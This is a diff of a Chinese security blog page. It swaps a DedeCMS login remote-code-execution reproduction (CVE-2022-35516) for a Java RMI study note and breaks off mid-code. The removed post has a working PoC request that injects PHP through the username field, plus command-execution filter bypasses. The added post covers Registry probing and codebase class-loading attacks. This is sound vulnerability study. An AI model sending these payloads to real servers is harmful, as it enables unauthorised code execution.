@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="https://qingwan.top/2024/01/08/dedecms远程代码执行复现 （cve-2022-35516）/"/>
+  <link rel="canonical" href="https://qingwan.top/2024/05/14/java安全漫谈--rmi/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,19 +34,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>DedeCMS远程代码执行复现 （CVE-2022-35516） - 清风菀月轩</title>
+  <title>Java安全漫谈学习笔记② -- JavaRMI (4-6) - 清风菀月轩</title>
   <meta name="keywords" content="undefined">
-  <meta desc name="description" content="Dedecms框架漏洞复现⑤ - Qingwan - 清风菀月轩">
+  <meta desc name="description" content="Java中RMI (Remote Method Invocation，远程方法调用) 模型的介绍及应用 - Qingwan - 清风菀月轩">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="DedeCMS远程代码执行复现 （CVE-2022-35516）">
-<meta property="og:url" content="https://qingwan.top/2024/01/08/DedeCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%20%EF%BC%88CVE-2022-35516%EF%BC%89/index.html">
+<meta property="og:title" content="Java安全漫谈学习笔记② -- JavaRMI (4-6)">
+<meta property="og:url" content="https://qingwan.top/2024/05/14/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88--RMI/index.html">
 <meta property="og:site_name" content="清风菀月轩">
-<meta property="og:description" content="Dedecms框架漏洞复现⑤">
+<meta property="og:description" content="Java中RMI (Remote Method Invocation，远程方法调用) 模型的介绍及应用">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-01-08T07:50:31.021Z">
-<meta property="article:modified_time" content="2024-01-08T07:54:08.839Z">
+<meta property="article:published_time" content="2024-05-14T04:24:40.929Z">
+<meta property="article:modified_time" content="2024-05-14T04:29:33.614Z">
 <meta property="article:author" content="Qingwan">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2581,7 +2581,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="https://qingwan.top/2024/01/08/DedeCMS远程代码执行复现 （CVE-2022-35516）/">
+  <link itemprop="mainEntityOfPage" href="https://qingwan.top/2024/05/14/Java安全漫谈--RMI/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="清风菀月轩">
   </span>
@@ -2602,7 +2602,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        DedeCMS远程代码执行复现 （CVE-2022-35516）
+        Java安全漫谈学习笔记② -- JavaRMI (4-6)
       </h1>
       <div class='new-meta-box'>
         
@@ -2621,10 +2621,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+    <a class="category-link" href="/categories/Java%E5%AD%A6%E4%B9%A0/">Java学习</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url"><span itemprop="name">代码审计</span></a>
+        <a href="/categories/Java%E5%AD%A6%E4%B9%A0/" itemprop="url"><span itemprop="name">Java学习</span></a>
       </span>
     
   </div>
@@ -2633,10 +2633,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-01-08T15:50:31+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-05-14T12:24:40+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：2024年1月8日</p>
+    <p>发布于：2024年5月14日</p>
   </a>
 </div>
 
@@ -2659,32 +2659,100 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>Dedecms框架漏洞复现⑤</p>
+    <p>Java中RMI (Remote Method Invocation，远程方法调用) 模型的介绍及应用</p>
 <span id="more"></span>
 
-<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p><code>dedecms 5.7.93 - 5.7.96</code></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>DedeCMS v5.7.93在<code>/dede/login. php</code>文件中增加了登录失败锁功能，以符合相关的Web安全法规。当用户登录失败时，失败消息将写入文件<code>/data/login.data.php</code>，以记录该用户登录失败的次数。</p>
-<p>我们看下<code>login.php</code>的关键代码，在我们登录的时候并没有验证用户名，就直接写入了文件<br><img src="https://qingwan.top/images/18106.png" class="lazyload" data-srcset="https://qingwan.top/images/18106.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>这里我们看到，如果我们连续登录失败，会将 <code>$arr_login</code> 在 <code>json_encode</code> 后写入文件<code>/data/login.data.php</code>中，写入内容有用户名，次数，时间，这里我们就可以通过给用户名赋值恶意代码导致RCE</p>
-<p><code>dedecms</code> 会对进入程序的所有变量进行一次过滤，比如这里的 <code>$userid</code>，过滤的具体代码位于 <code>/include/common.inc.php</code><br><img src="https://qingwan.top/images/18107.png" class="lazyload" data-srcset="https://qingwan.top/images/18107.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>这里对变量使用了<code>addslashes()</code> 函数，按理来说我们写入了<br><code>&#39;;phpinfo();?&gt;</code>  存到文件中之后，会转变成<code> \&#39;;phpinfo();?&gt;</code>，这样我们的<code>&#39;</code>就被转义了，就无法闭合之前的单引号。但是这里的问题出在我们的登录信息存到文件中的时候是经过<code>json_encode</code>的，<code>json_encode</code> 会转义 <code>/\</code> 等字符。<br>所以最后变成了<br><code>&#39;;phpinfo();?&gt;</code>  -&gt; <code>\&#39;;phpinfo();?&gt; </code> -&gt; <code>\\&#39;;phpinfo();?&gt;</code><br>这里又将转义字符转义回去了，所以我们的<code>&#39;</code>也会起到转换的作用，进而闭合，进行RCE<br><img src="https://qingwan.top/images/18108.png" class="lazyload" data-srcset="https://qingwan.top/images/18108.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="https://qingwan.top/images/18109.png" class="lazyload" data-srcset="https://qingwan.top/images/18109.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>访问登录页面，然后输入用户名<code>&#39;;phpinfo();?&gt;&#39; 我在登录第二次的时候，就看到闪过了</code>phpinfo<code>的界面 我们发现在网站目录下确实生成了</code>login.data.php&#96;这个文件<br><img src="https://qingwan.top/images/18110.png" class="lazyload" data-srcset="https://qingwan.top/images/18110.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>访问一下这个文件<br><img src="https://qingwan.top/images/18111.png" class="lazyload" data-srcset="https://qingwan.top/images/18111.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>所以POC为</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /dede/login.php HTTP/1.1</span><br><span class="line">Host: dedecms5793</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=e9ag7oevkh77gnko3cdmt7mbc2</span><br><span class="line"></span><br><span class="line">dopost=login&amp;userid=%5C%27.phpinfo%28%29%3B%3F%3E&amp;pwd=1234&amp;validate=hw0k</span><br></pre></td></tr></table></figure>
-<h2 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h2><p>在 <code>5.7.97</code> 中， <code>login.php</code> 中对应的代码变成了下面这样<br><img src="https://qingwan.top/images/18112.png" class="lazyload" data-srcset="https://qingwan.top/images/18112.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>此处添加了<code>$res==-1</code>这个比较，就要求我们登录的用户名必须是经过注册了的，如果不存在，将会直接退出而不会写入文件中<br>这里修复之后其实还可以进行绕过，详细可以看<a target="_blank" rel="noopener" href="https://n0puple.github.io/2022/10/04/DedeCMS-5-7-97-%E5%89%8D%E5%8F%B0RCE-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8E%E5%88%86%E6%9E%90/#%E4%BF%AE%E8%A1%A5%E7%BB%95%E8%BF%87">这篇文章</a></p>
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol>
-<li>这里由于单引号和双引号的作用，比如我们想执行<code>whoami</code>命令，我们就不能使用<code>system(&#39;whoami&#39;);</code>这些命令执行的函数了，因为他们写到文件里面之后会变成<br> <code>system(\\&#39;whoami\\&#39;);</code>，这时候会进行报错，因为我们不能在函数的头尾的单引号上面使用转义。那这样的话，我们有什么办法去使用我们的函数去执行命令呢<br> 这里就可以使用一些ctf中常见的绕过手法了</li>
+<h2 id="RMI的过程分析"><a href="#RMI的过程分析" class="headerlink" title="RMI的过程分析"></a>RMI的过程分析</h2><p>RMI (<code>Remote Method Invocation</code>，远程方法调用) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM(java虚拟机) 中的对象调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 <code>Server</code> 端和一个 <code>Client</code> 端。<br>这里首先编写一个 <code>RMI Server</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">package org.vulhub.RMI;  </span><br><span class="line">import java.rmi.Naming;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">  </span><br><span class="line">public class RMIServer &#123;  </span><br><span class="line">    public interface IRemoteHelloWorld extends Remote &#123;  </span><br><span class="line">        public String hello() throws RemoteException;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public class RemoteHelloWorld extends UnicastRemoteObject implements  </span><br><span class="line">            IRemoteHelloWorld &#123;  </span><br><span class="line">        protected RemoteHelloWorld() throws RemoteException &#123;  </span><br><span class="line">            super();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public String hello() throws RemoteException &#123;  </span><br><span class="line">            System.out.println(&quot;call from&quot;);  </span><br><span class="line">            return &quot;Hello world&quot;;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    private void start() throws Exception &#123;  </span><br><span class="line">        RemoteHelloWorld h = new RemoteHelloWorld();  </span><br><span class="line">        </span><br><span class="line">        //创建并运行RMI Registry</span><br><span class="line">        LocateRegistry.createRegistry(1099);  </span><br><span class="line">        </span><br><span class="line">        //将RemoteHelloWorld对象绑定到Hello这个名字上</span><br><span class="line">        Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        new RMIServer().start();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码是一个简单的 Java RMI（远程方法调用）示例，我们来仔细的分析一下这段代码</p>
+<ol>
+<li><code>public interface IRemoteHelloWorld extends Remote &#123; ... &#125;</code>：<ul>
+<li>这是一个远程接口，它扩展了 <code>Remote</code> 接口。在 RMI 中，远程接口定义了客户端和服务器之间可以调用的远程方法。这部分算第一个部分，继承接口，定义远程调用函数 <code>hello()</code></li>
+</ul>
+</li>
+<li><code>public class RemoteHelloWorld extends UnicastRemoteObject implements IRemoteHelloWorld &#123; ... &#125;</code>：<ul>
+<li>这是一个远程对象类，它实现了远程接口 <code>IRemoteHelloWorld</code>。在 RMI 中，远程对象是服务器上的对象，它包含了远程方法的实现。这是第二个部分，实现了此接口的类。</li>
+</ul>
+</li>
+<li><code>private void start() throws Exception &#123; ... &#125;</code>：<ul>
+<li>这是一个私有方法，用于启动 RMI 服务器。在方法内部，首先创建了一个 <code>RemoteHelloWorld</code> 对象，然后使用 <code>LocateRegistry.createRegistry(1099)</code> 创建了 RMI 注册表，该注册表将在本地主机的 1099 端口上监听远程方法调用。最后，使用 <code>Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h)</code> 将远程对象绑定到注册表中，以便客户端可以通过指定的 URL 访问远程对象。</li>
+</ul>
+</li>
+<li><code>public static void main(String[] args) throws Exception &#123; ... &#125;</code>：<ul>
+<li>这是主方法，用于启动 RMI 服务器。在方法内部，创建了一个 <code>RMIServer</code> 对象，并调用了其 <code>start()</code> 方法来启动 RMI 服务器。这个和上面那段算作是第三部分，主类，创建 <code>Registry</code>，将类实例化之后绑定到一个地址。</li>
+</ul>
+</li>
 </ol>
-<p>回答：<br>①使用反引号 比如 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo `whoami`;</span><br><span class="line">&#x27;;echo `whoami`;?&gt;   //输入的用户名</span><br><span class="line"></span><br><span class="line">echo `dir`;</span><br><span class="line">&#x27;;echo `dir`;?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>②<code>chr()</code>函数+连接符<code>.</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(chr(119) . chr(104) . chr(111) . chr(97) . chr(109) . chr(105));</span><br><span class="line">&#x27;;system(chr(119).chr(104).chr(111).chr(97).chr(109).chr(105));?&gt;    //用户名</span><br></pre></td></tr></table></figure>
-
-<p>③括号<code>(</code>绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(sy.(st).em)(whoami);</span><br><span class="line">&#x27;;(sy.(st).em)(whoami);?&gt;    //用户名</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>框架中还有没有其他的地方有类似的写法</li>
+<p>总的来说，这段代码实现了一个简单的 RMI 服务器，该服务器提供了一个名为 “Hello” 的远程对象，客户端可以通过 RMI 调用该对象的 <code>hello()</code> 方法来获取 “Hello world” 字符串。</p>
+<p>这段代码只有在客户端连接的时候才会调用<code>hello()</code> 方法，才会有输出，但是如果我们想知道这个代码有没有被执行的话怎么办呢，我们可以自己手动添加输出代码，这样就可以知道有没有执行了，代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private void start() throws Exception &#123;  </span><br><span class="line">    RemoteHelloWorld h = new RemoteHelloWorld();  </span><br><span class="line">    LocateRegistry.createRegistry(1099);  </span><br><span class="line">    System.out.println(&quot;RMI Registry created.&quot;); // 添加输出</span><br><span class="line">    Naming.rebind(&quot;rmi://127.0.0.1:1099/Hello&quot;, h);  </span><br><span class="line">    System.out.println(&quot;Remote object bound.&quot;); // 添加输出</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>好，那么 <code>RMI Server</code>的编写和结构介绍完了，接下来我们就介绍一下 <code>RMI Client</code>，这个客户端和前面的服务端对应</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package org.vulhub.Train;  </span><br><span class="line">import org.vulhub.RMI.RMIServer;  </span><br><span class="line">import java.rmi.Naming;  </span><br><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">public class TrainMain &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld)  </span><br><span class="line">                Naming.lookup(&quot;rmi://127.0.0.1:1099/Hello&quot;);  </span><br><span class="line">        String ret = hello.hello();  </span><br><span class="line">        System.out.println( ret);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行成功之后会发现客户端输出了 <code>Hello world</code>，服务端输出了 <code>call from</code><br>我们来分析一下客户端的代码，客户端代码很简单，主要就是在方法内部，我们首先使用 <code>Naming.lookup()</code> 方法查找在指定 URL 下绑定的远程对象，即通过 <code>Name</code>向 <code>RMI Registry</code>查询，并将其强制转换为远程接口类型 <code>IRemoteHelloWorld</code>。然后，我们调用远程接口的 <code>hello()</code> 方法，获取返回的字符串并打印输出。这段代码实现了一个简单的 RMI 客户端，它连接到指定的 RMI 服务器并调用其提供的远程方法。</p>
+<p>我们来仔细分析一下RMI的通信过程，我们来抓包看看，监听我们本地的 <code>Loopback</code> 回环接口<br><img src="https://qingwan.top/images/245141.png" class="lazyload" data-srcset="https://qingwan.top/images/245141.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>然后运行我们的两个脚本，可以看到整个过程经历了两次TCP握手<br><img src="https://qingwan.top/images/245142.png" class="lazyload" data-srcset="https://qingwan.top/images/245142.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>
+<p>第⼀次建⽴TCP连接是连接 <code>127.0.0.1</code> 的1099端⼝，这也是我们在代码⾥看到的端⼝，⼆<br>者进⾏沟通后，我向远端发送了⼀个<code>“Call”</code>消息，远端回复了⼀个<code>“ReturnData”</code>消息，然后新建了⼀<br>个TCP连接，连到远端的<code>50954</code>端⼝。<br>在 RMI（远程方法调用）中，<code>&quot;Call&quot;</code> 消息和 <code>&quot;ReturnData&quot;</code> 消息是 RMI 通信过程中的两种重要消息类型，它们的含义如下：</p>
+<ol>
+<li><code>&quot;Call&quot;</code> 消息：<ul>
+<li><code>&quot;Call&quot;</code> 消息是客户端发送给服务器端的消息，用于请求远程方法的调用。当客户端想要调用远程对象的方法时，它会发送一个 <code>&quot;Call&quot;</code> 消息给服务器端，以触发远程方法的执行。</li>
+</ul>
+</li>
+<li><code>&quot;ReturnData&quot;</code> 消息：<ul>
+<li><code>&quot;ReturnData&quot;</code> 消息是服务器端响应客户端请求的消息，用于返回远程方法调用的结果。当服务器端收到客户端的 <code>&quot;Call&quot;</code> 消息后，会执行相应的远程方法，并将方法执行的结果封装成 <code>&quot;ReturnData&quot;</code> 消息发送给客户端，以便客户端获取远程方法的执行结果。<br>所以整个过程大概为：<br>⾸先客户端连接<code>Registry</code>，并在其中寻找Name是<code>Hello</code>的对象，这个对应数据流中的<code>Call</code>消息；然后<code>Registry</code>返回⼀个序列化的数据，这个就是找到的<code>Name=Hello</code>的对象，这个对应<br>数据流中的<code>ReturnData</code>消息；客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 <code>192.168.174.1:50954</code> ，于是再与这个地址建⽴TCP连接；在这个新的连接中，才执⾏真正远程<br>⽅法调⽤，也就是 <code>hello()</code>。<br>整个过程的大致就是，服务器注册RMI服务，将对象与Name绑定，客户端通过<code>lookup</code>在<code>RMI Registry</code>中寻找要加载远程对象，然后再发起请求从<code>RMI Server</code>上调用方法。</li>
+</ul>
+</li>
 </ol>
-<p>回答：目前没有发现</p>
+<hr>
+<p>第一篇讲了 RMI 的整个过程和原理，那我们想一下 RMI 会给我们带来哪些安全问题呢？<br>P神的文章里提出了两个思考问题：</p>
+<blockquote>
+<ol>
+<li>如果我们能访问RMI Registry服务，如何对其攻击？</li>
+<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地<br>  址），能不能进行攻击？</li>
+</ol>
+</blockquote>
+<p>第一个问题，怎么攻击 <code>RMI Registry</code>？<br>首先，<code>RMI Registry</code> 是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直<br>接访问“后台”功能，比如修改远程服务器上Hello对应的对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RemoteHelloWorld h = new RemoteHelloWorld();</span><br><span class="line">//这里我们把ip替换成了其他的ip</span><br><span class="line">Naming.rebind(&quot;rmi://192.168.135.142:1099/Hello&quot;, h);</span><br></pre></td></tr></table></figure>
+<p>但是我们发现会报错<br><img src="https://qingwan.top/images/245143.png" class="lazyload" data-srcset="https://qingwan.top/images/245143.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><br>我们看到这里创建并运行了<code>RMI Registry</code>，但是并不能绑定对象，并且产生了报错，这又是为什么呢？</p>
+<p>因为Java对远程访问<code>RMI Registry</code>做了限制，只有来源地址是<code>localhost(127.0.0.1)</code>的时候，才能调用<code>rebind、bind、unbind</code>等方法。不过<code>list</code>和<code>lookup</code>方法可以远程调用。</p>
+<p><code>list</code>方法可以列出目标上所有绑定的对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] s = Naming.list(&quot;rmi://192.168.135.142:1099&quot;);</span><br></pre></td></tr></table></figure>
+<p><code>lookup</code>作用就是获得某个远程对象。</p>
+<p>那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用。<br>但是这个攻击方法的攻击力太低了，接下来介绍一个攻击力强的多的方法。</p>
+<h2 id="RMI相关攻击手法-–-RMI利用codebase执行任意代码"><a href="#RMI相关攻击手法-–-RMI利用codebase执行任意代码" class="headerlink" title="RMI相关攻击手法 – RMI利用codebase执行任意代码"></a>RMI相关攻击手法 – RMI利用codebase执行任意代码</h2><p>这里我们就来说说 <code>codebase</code> 是什么。<code>codebase</code>是一个地址，即url，告诉Java虚拟机我们应该从哪个地方去搜索类，<code>codebase</code>通常是远程URL，比如http、ftp等。<br>例如，如果我们指定 <code>codebase=http://example.com/</code> ，然后加载 <code>org.vulhub.example.Example</code> 类，则Java虚拟机会下载这个文件 <code>http://example.com/org/vulhub/example/Example.class</code> ，并作为<code>Example</code>类的字节码。<br>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的<code>CLASSPATH</code>下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载<code>codebase</code>中的类。这个和python中的导入的包也是一个道理，首先会在当前路径下寻找有没有这个包，如果没有，才是在<code>环境变量 PYTHONPATH</code>中或者是<strong>Python 标准库目录</strong>下去寻找。</p>
+<p>那这时候如果<code>codebase</code>被我们控制，我们不就可以加载恶意类了吗？事实是确实是这样的，但是这个利用方法也有一定的局限性，只有满足下面两个条件才能利用这个漏洞</p>
+<ul>
+<li>安装并配置了<code>SecurityManager</code></li>
+<li>Java版本低于<code>7u21</code>、<code>6u45</code>，或者设置了 <code>java.rmi.server.useCodebaseOnly=false</code><br>其中 <code>java.rmi.server.useCodebaseOnly </code> 是在<code>Java 7u21</code>、<code>6u45</code>的时候修改的一个默认设置。</li>
+</ul>
+<p>从 Java 7 开始，由于安全考虑，官方将 <code>java.rmi.server.useCodebaseOnly</code> 的默认值从<code>false</code>改为了 <code>true</code>。当 <code>java.rmi.server.useCodebaseOnly</code> 配置为 <code>true</code> 时，Java 虚拟机将只信任预先配置好的 <code>codebase</code>，不再支持从 RMI 请求中获取 <code>codebase</code> 信息。</p>
+<p>但是感觉这个java版本和配置的要求现在也很少见了，但是这里涉及到第二个问题和RMI的第三篇文章，所以我们还是简单的叙述解释一下步骤一下。这里还是按照P神在文章中给出的方法。<br>首先建立有关 <code>RMI Server</code>的4个文件<br>① <code>ICalc.java</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.util.List;  </span><br><span class="line">public interface ICalc extends Remote &#123;  </span><br><span class="line">    public Integer sum(List&lt;Integer&gt; params) throws RemoteException;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>② <code>Calc.java</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.util.List;  </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">public class Calc extends UnicastRemoteObject implements ICalc &#123;  </span><br><span class="line">    public Calc() throws RemoteException &#123;&#125;  </span><br><span class="line">    public Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;  </span><br><span class="line">        Integer sum = 0;  </span><br><span class="line">        for (Integer param : params) &#123;  </span><br><span class="line">            sum += param;  </span><br><span class="line">        &#125;  </span><br><span class="line">        return sum;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>③ <code>RemoteRMIServer.java</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.Naming;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">import java.util.List;  </span><br><span class="line">public class RemoteRMIServer &#123;  </span><br><span class="line">    private void start() throws Exception &#123;  </span><br><span class="line">        if (System.getSecurityManager() == null) &#123;  </span><br><span class="line">            System.out.println(&quot;setup SecurityManager&quot;);  </span><br><span class="line">            System.setSecurityManager(new SecurityManager());  </span><br><span class="line">        &#125;  </span><br><span class="line">        Calc h = new Calc();  </span><br><span 